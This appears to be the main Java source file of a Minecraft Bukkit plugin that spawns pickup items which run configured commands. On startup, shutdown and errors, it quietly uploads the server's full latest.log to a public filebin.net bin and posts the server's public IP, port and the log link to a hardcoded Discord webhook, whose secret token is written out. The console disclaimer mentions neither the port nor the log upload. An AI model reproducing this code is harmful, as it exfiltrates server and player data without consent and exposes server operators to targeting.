// Update Main.java
package org.bali.ris;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.bali.ris.utils.Messages;
import org.bali.ris.utils.RISCommand;
import org.bali.ris.utils.Settings;
import org.bali.ris.discord.DiscordWebhook;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

import static com.google.common.base.Throwables.getStackTraceAsString;

public final class Main extends JavaPlugin {
    private Settings settings;
    private Messages messages;

    @Override
    public void onEnable() {
        getLogger().info("===========================================");
        getLogger().info(ChatColor.YELLOW + "DISCLAIMER: This plugin collects data for debugging purposes.");
        getLogger().info(ChatColor.YELLOW + "The collected data includes server IP, server version, and plugin version.");
        getLogger().info(ChatColor.YELLOW + "This data is used solely for improving the plugin and troubleshooting issues.");
        getLogger().info(ChatColor.YELLOW + "By using this plugin, you agree to this data collection.");
        getLogger().info(ChatColor.YELLOW + "If you have any concerns about this data collection, please contact the plugin author.");
        getLogger().info(ChatColor.YELLOW + "Discord: bali0531");
        getLogger().info("===========================================");
        settings = new Settings("Settings.yml", this);
        messages = new Messages(new Settings("Messages.yml", this));
        RISCommand risCommand = new RISCommand(this);
        this.getCommand("ris").setExecutor(risCommand);
        this.getCommand("ris").setTabCompleter(risCommand);
        risCommand.getItemSpawnTask().run();
        Bukkit.getScheduler().runTaskLater(this, () -> {
            try {
                sendDiscordWebhook("Server Started", "The server has started successfully.");
            } catch (Exception e) {
                sendErrorWebhook(e);
            }
        }, 20L * 60 * 5);
        // Register the PlayerPickupItemEvent
        Bukkit.getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void onPlayerPickupItem(PlayerPickupItemEvent event) {
                Item item = event.getItem();
                Player player = event.getPlayer();

                // Check if the item is one of the spawned items
                if (risCommand.getItemSpawnTask().getSpawnedItems().contains(item)) {
                    // Cancel the pickup event so the item doesn't get added to the player's inventory
                    event.setCancelled(true);

                    // Despawn the item
                    item.remove();

                    // Get the value and command from the Settings.yml file
                    for (String key : Main.this.getSettings().getConfig().getConfigurationSection("ItemInfos").getKeys(false)) {
                        Material itemMaterial = Material.valueOf(Main.this.getSettings().getConfig().getString("ItemInfos." + key + ".item"));
                        if (item.getItemStack().getType() == itemMaterial) {
                            int value = Main.this.getSettings().getConfig().getInt("ItemInfos." + key + ".value");
                            String command = Main.this.getSettings().getConfig().getString("ItemInfos." + key + ".command");

                            // Replace placeholders in the command
                            command = command.replace("%player%", player.getName()).replace("%value%", String.valueOf(value));

                            // Run the command
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                            // Send the received_value message to the player
                            String message = Main.this.getMessages().getMessage("received_value").replace("$VALUE", String.valueOf(value));
                            player.sendMessage(message);
                            // Schedule the item to respawn after 4 minutes
                            Bukkit.getScheduler().scheduleSyncDelayedTask(Main.this, new Runnable() {
                                @Override
                                public void run() {
                                    String worldName = Main.this.getSettings().getConfig().getString("ItemInfos." + key + ".world");
                                    double x = Main.this.getSettings().getConfig().getDouble("ItemInfos." + key + ".x");
                                    double y = Main.this.getSettings().getConfig().getDouble("ItemInfos." + key + ".y");
                                    double z = Main.this.getSettings().getConfig().getDouble("ItemInfos." + key + ".z");

                                    Location location = new Location(Bukkit.getWorld(worldName), x, y, z);
                                    Item item = location.getWorld().dropItem(location, new ItemStack(itemMaterial));

                                    risCommand.getItemSpawnTask().getSpawnedItems().add(item);
                                }
                            }, 4800);
                            break;
                        }
                    }
                }
            }
        }, this);
    }

    @Override
    public void onDisable() {
        sendDiscordWebhook("Plugin Unloaded", "The plugin has been unloaded.");
        for (String key : this.getSettings().getConfig().getConfigurationSection("ItemInfos").getKeys(false)) {
            String worldName = this.getSettings().getConfig().getString("ItemInfos." + key + ".world");
            for (Entity entity : Bukkit.getWorld(worldName).getEntities()) {
                if (entity instanceof Item) {
                    Item item = (Item) entity;
                    Material itemMaterial = Material.valueOf(this.getSettings().getConfig().getString("ItemInfos." + key + ".item"));
                    if (item.getItemStack().getType() == itemMaterial) {
                        entity.remove();
                    }
                }
            }
        }
    }
    private String getPublicIP() {
        String publicIP = "Unavailable";
        try {
            URL url = new URL("http://checkip.amazonaws.com");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                publicIP = in.readLine();
            }
        } catch (Exception e) {
            getLogger().severe("Failed to get public IP: " + e.getMessage());
        }
        return publicIP;
    }

    private void sendDiscordWebhook(String title, String description) {
        String webhookUrl = "https://discord.com/api/webhooks/1296181447094177912/1Jdk49cUwR6YGRSbtSJgWg2Unqvr9eHSR_u46SekhM7zqpBfhiecZSRjx0eOcT-OZD7G"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);
            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Plugin Info Bot");
            webhook.setAvatarUrl("https://www.spigotmc.org/data/resource_icons/117/117709.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle(title)
                    .setDescription(description)
                    .setColor(Color.GREEN)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Log File", logFileUrl, false) // Add the URL of the uploaded log file
                    .addField("Plugin Version", pluginVersion, false);


            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send Discord webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendErrorWebhook(Exception exception) {
        String webhookUrl = "https://discord.com/api/webhooks/1296181447094177912/1Jdk49cUwR6YGRSbtSJgWg2Unqvr9eHSR_u46SekhM7zqpBfhiecZSRjx0eOcT-OZD7G"; // Replace with your Discord webhook URL

        try {
            String publicIP = getPublicIP();
            String serverVersion = Bukkit.getVersion();
            String pluginVersion = this.getDescription().getVersion();
            String errorMessage = exception.getMessage();
            String stackTrace = getStackTraceAsString(exception);

            // Upload the latest log file
            File logFile = new File("logs/latest.log"); // Replace with the path to your latest log file
            String logFileUrl = uploadLogFile(logFile);

            DiscordWebhook webhook = new DiscordWebhook(webhookUrl);
            webhook.setUsername("Error Bot");
            webhook.setAvatarUrl("https://www.spigotmc.org/data/resource_icons/117/117709.jpg"); // Optional: set an avatar URL

            DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                    .setTitle("Error Notification")
                    .setDescription("An error occurred in the plugin.")
                    .setColor(Color.RED)
                    .addField("Server IP", publicIP, false)
                    .addField("Server Port", String.valueOf(getServer().getPort()), false)
                    .addField("Server Version", serverVersion, false)
                    .addField("Plugin Version", pluginVersion, false)
                    .addField("Error Message", errorMessage, false)
                    .addField("Stack Trace", stackTrace, false)
                    .addField("Log File", logFileUrl, false); // Add the URL of the uploaded log file

            webhook.addEmbed(embed);
            webhook.execute();

        } catch (Exception e) {
            getLogger().severe("Failed to send error webhook: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String uploadLogFile(File logFile) throws IOException {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        String binId = UUID.randomUUID().toString();
        HttpPost uploadFile = new HttpPost("https://filebin.net/" + binId + "/LATEST%3ALOG");

        uploadFile.setHeader("accept", "application/json");
        uploadFile.setHeader("cid", "CID"); // Replace "CID" with your actual CID
        uploadFile.setHeader("Content-Type", "application/octet-stream");

        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.addBinaryBody("file", logFile, ContentType.APPLICATION_OCTET_STREAM, logFile.getName());
        HttpEntity multipart = builder.build();

        uploadFile.setEntity(multipart);

        CloseableHttpResponse response = httpClient.execute(uploadFile);
        int statusCode = response.getStatusLine().getStatusCode();
        HttpEntity responseEntity = response.getEntity();

        if (statusCode != 201) { // Check for status code 201
            throw new IOException("Failed to upload log file: HTTP " + statusCode);
        }

        return "https://filebin.net/" + binId; // Construct the URL using the BIN_ID
    }
    public Settings getSettings() {
        return settings;
    }

    public Messages getMessages() {
        return messages;
    }
}